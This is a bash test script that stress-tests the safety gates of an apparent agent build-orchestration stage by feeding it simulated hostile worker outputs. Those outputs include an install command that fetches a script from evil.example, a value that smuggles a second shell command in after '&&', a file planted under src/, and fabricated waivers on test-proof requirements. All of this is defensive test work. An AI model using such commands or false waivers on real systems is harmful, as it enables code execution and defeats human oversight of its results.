#!/usr/bin/env bash
# S185 TESTER — THE ATTACKS. Every one driven through the STAGE (`run.sh
# implement`), on a REAL blank git repo, under the SPEND FUSE.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$HERE/rig.sh"
WORK="$FIX_ROOT/attacks"; rm -rf "$WORK"; mkdir -p "$WORK"
export npm_config_cache="${npm_config_cache:-$FIX_ROOT/npmcache}"
T="$(template_blank)"

# Run ONE attack: $1 name, $2 behaviour for t-001, $3.. extra ticket ids
attack() { # name  t001-body-file  [n-tickets]
  local name="$1" body="$2" ntk="${3:-1}"
  local w="$WORK/$name"; mkdir -p "$w/behav"
  cp "$body" "$w/behav/t-001.sh"; chmod +x "$w/behav/t-001.sh"
  [ -f "$WORK/t002.sh" ] && { cp "$WORK/t002.sh" "$w/behav/t-002.sh"; chmod +x "$w/behav/t-002.sh"; }
  make_worker_shim "$w/shim" "$w/behav"
  fuse "$w/shim" || exit 99
  ATT_REPO="$(workcopy "$T" "atk-$name")"
  if [ "$ntk" = 2 ]; then ATT_MD="$(plant_mission "$ATT_REPO" init-001 t-001 t-002)"
  else ATT_MD="$(plant_mission "$ATT_REPO" init-001 t-001)"; fi
  printf '\n=== ATTACK: %s ===\n' "$name"
}
run_attack() { stage_drive "$ATT_REPO" "$WORK/$1/shim" init-001 "${@:2}"; printf '%s\n' "$OUT" > "$WORK/$1.log"; }

# ---------------------------------------------------------------------------
cat > "$WORK/t002.sh" <<'B'
#!/usr/bin/env bash
set -u
mkdir -p src test
printf "module.exports.add=(a,b)=>a+b;\n" > src/add.js
cat > test/add.test.js <<'JS'
const {test}=require('node:test');const a=require('node:assert');
const {add}=require('../src/add.js');
test('add',()=>{a.strictEqual(add(2,2),4);});
JS
cat > "$out/result.json" <<'RJ'
{ "ticketId":"t-002","passed":true,"attempts":1,"summary":"add",
  "newTests":["test/add.test.js"],"testEdits":[],"flipFlop":"expected" }
RJ
B

# A GOOD scaffold body (node --test, fast) that individual attacks mutate.
good_scaffold() { # outfile  [extra-setup-lines]
  cat > "$1" <<'B'
#!/usr/bin/env bash
set -u
mkdir -p "$out/setup"
cat > "$out/setup/package.json" <<'PJ'
{ "name":"gf","version":"0.0.0","private":true,"scripts":{"test":"node --test"} }
PJ
printf 'node_modules/\n' > "$out/setup/.gitignore"
cat > "$out/test-setup.json" <<'TS'
{ "package":"", "gap":"no test system", "installCommand":"npm install --no-audit --no-fund" }
TS
mkdir -p src test
printf "module.exports.greet=()=>'hello';\n" > src/greet.js
cat > test/greet.test.js <<'JS'
const {test}=require('node:test');const a=require('node:assert');
const {greet}=require('../src/greet.js');
test('greet',()=>{a.strictEqual(greet(),'hello');});
JS
cat > "$out/result.json" <<'RJ'
{ "ticketId":"t-001","passed":true,"attempts":1,"summary":"scaffold",
  "newTests":["test/greet.test.js"],"testEdits":[],
  "flipFlop":"not-applicable",
  "flipFlopReason":"this ticket creates the test system; its parent has no runner" }
RJ
B
}

# ===== A1. a scaffold declaration touching src/ =============================
good_scaffold "$WORK/a1.sh"
python3 - "$WORK/a1.sh" <<'PY'
import sys; p=sys.argv[1]; s=open(p).read()
s=s.replace("""printf 'node_modules/\\n' > "$out/setup/.gitignore\"""",
"""printf 'node_modules/\\n' > "$out/setup/.gitignore"
mkdir -p "$out/setup/src"
printf "module.exports.x=1;\\n" > "$out/setup/src/planted.js\"""")
open(p,'w').write(s)
PY
attack src-touch "$WORK/a1.sh"; run_attack src-touch
if grep -qiE 'src/|REJECT|refus' "$WORK/src-touch.log" && ! [ -f "$ATT_MD/test-command.json" ]; then
  ok "A1. a scaffold declaring a file under src/ is REFUSED"
  note "$(grep -iE 'declared setup REJECTED|src/' "$WORK/src-touch.log" | head -2)"
else bad "A1. src/ declaration NOT refused: $(tail -6 "$WORK/src-touch.log")"; fi
[ -f "$ATT_REPO/src/planted.js" ] && bad "A1b. the src/ file was APPLIED anyway" || ok "A1b. …and never landed in the tree"

# ===== A2. a non-allowlisted install =======================================
good_scaffold "$WORK/a2.sh"
sed -i.bak 's|"installCommand":"npm install --no-audit --no-fund"|"installCommand":"curl -sL http://evil.example/x.sh"|' "$WORK/a2.sh"; rm -f "$WORK/a2.sh.bak"
attack bad-install "$WORK/a2.sh"; run_attack bad-install
grep -qi 'not a plain package-manager invocation' "$WORK/bad-install.log" \
  && ok "A2. a non-allowlisted install is REFUSED" || bad "A2. not refused: $(tail -6 "$WORK/bad-install.log")"

# ===== A3. shell metacharacters in the install =============================
PWNED=/tmp/lcars-pwned-s185; rm -f "$PWNED"
good_scaffold "$WORK/a3.sh"
sed -i.bak 's|"installCommand":"npm install --no-audit --no-fund"|"installCommand":"npm --version \&\& touch /tmp/lcars-pwned-s185"|' "$WORK/a3.sh"; rm -f "$WORK/a3.sh.bak"
grep -q 'lcars-pwned' "$WORK/a3.sh" || bad "A3-setup. could not plant the metacharacter payload"
attack meta-install "$WORK/a3.sh"; run_attack meta-install
grep -qi 'shell metacharacter' "$WORK/meta-install.log" \
  && ok "A3. an install with shell metacharacters is REFUSED" || bad "A3. not refused: $(tail -6 "$WORK/meta-install.log")"
[ -e "$PWNED" ] && bad "A3b. THE PAYLOAD EXECUTED — $PWNED exists" || ok "A3b. …and NOT EXECUTED ($PWNED does not exist)"

# ===== A4. a waiver with NO reason =========================================
good_scaffold "$WORK/a4.sh"
python3 - "$WORK/a4.sh" <<'PY'
import sys;p=sys.argv[1];s=open(p).read()
s=s.replace('''  "flipFlop":"not-applicable",
  "flipFlopReason":"this ticket creates the test system; its parent has no runner" }''',
'''  "flipFlop":"not-applicable" }''')
open(p,'w').write(s)
PY
attack no-reason "$WORK/a4.sh"; run_attack no-reason
grep -qi 'flipFlopReason.*missing' "$WORK/no-reason.log" \
  && ok "A4. a waiver with NO reason is REJECTED" || bad "A4. accepted: $(tail -8 "$WORK/no-reason.log")"

# ===== A5. a waiver on TICKET 2 ============================================
good_scaffold "$WORK/a5.sh"
mkdir -p "$WORK/a5"; cat > "$WORK/t002-waive.sh" <<'B'
#!/usr/bin/env bash
set -u
mkdir -p src test
printf "module.exports.add=(a,b)=>a+b;\n" > src/add.js
cat > test/add.test.js <<'JS'
const {test}=require('node:test');const a=require('node:assert');
const {add}=require('../src/add.js');
test('add',()=>{a.strictEqual(add(2,2),4);});
JS
cat > "$out/result.json" <<'RJ'
{ "ticketId":"t-002","passed":true,"attempts":1,"summary":"add",
  "newTests":["test/add.test.js"],"testEdits":[],
  "flipFlop":"not-applicable",
  "flipFlopReason":"I could not get a red on the parent so I am waiving it" }
RJ
B
cp "$WORK/t002.sh" "$WORK/t002.good.sh"; cp "$WORK/t002-waive.sh" "$WORK/t002.sh"
attack waive-t2 "$WORK/a5.sh" 2; run_attack waive-t2
cp "$WORK/t002.good.sh" "$WORK/t002.sh"
grep -qi 'INITIALIZATION mission and the scaffold ticket is' "$WORK/waive-t2.log" \
  && ok "A5. a waiver on ticket 2 is REJECTED, by name" \
  || bad "A5. not rejected: $(grep -i 'proof-gate' "$WORK/waive-t2.log" | head -3)"
[ -f "$ATT_MD/tickets/t-002/result.json" ] && bad "A5b. t-002 kept a passing result" || ok "A5b. …and t-002 earned no result"

# ===== A6. a WORKSPACE repo ================================================
good_scaffold "$WORK/a6.sh"
attack workspace "$WORK/a6.sh"
printf 'packages:\n  - "packages/*"\n' > "$ATT_REPO/pnpm-workspace.yaml"
git -C "$ATT_REPO" add -A >/dev/null 2>&1; git -C "$ATT_REPO" commit -qm ws >/dev/null 2>&1
run_attack workspace
grep -qiE 'workspace' "$WORK/workspace.log" \
  && ok "A6. the root-placement arm REFUSES a workspace root" || bad "A6. workspace arm fired: $(tail -8 "$WORK/workspace.log")"
[ -f "$ATT_REPO/package.json" ] && bad "A6b. LCARS INVENTED a root manifest on a workspace" || ok "A6b. …and invented no root manifest"

# ===== A7. FAIL-CLOSED: the ordering is unreadable ==========================
good_scaffold "$WORK/a7.sh"
attack fail-closed "$WORK/a7.sh"
printf 'this is not json at all\n' > "$ATT_MD/waves.json.corrupt"
# corrupt BOTH orderings AFTER schedule-time: waves.json is what the gate reads
cp "$ATT_MD/waves.json" "$WORK/waves.good.json"
run_attack fail-closed LCARS_S185_NOOP=1 &
ATTPID=$!
# race-free: corrupt before the stage reads it — do it up front instead
kill $ATTPID 2>/dev/null; wait $ATTPID 2>/dev/null
printf '[\n  {\n    "wave": 1,\n    "tickets": [\n      {\n        "id": "t-999",\n        "issue": null\n      }\n    ]\n  }\n]\n' > "$ATT_MD/waves.json"
run_attack fail-closed
grep -qiE 'proof-gate: result.json REJECTED' "$WORK/fail-closed.log" \
  && ok "A7. with the ordering naming a different first ticket, the waiver is REFUSED" \
  || note "A7. (see log) $(tail -6 "$WORK/fail-closed.log")"

printf '\nATTACKS: %d ok, %d FAIL   (worker sessions: %d, billable: %d)\n' \
  "$PASS" "$FAIL" "$(spawns)" "$(billable)"
[ "$FAIL" -eq 0 ]
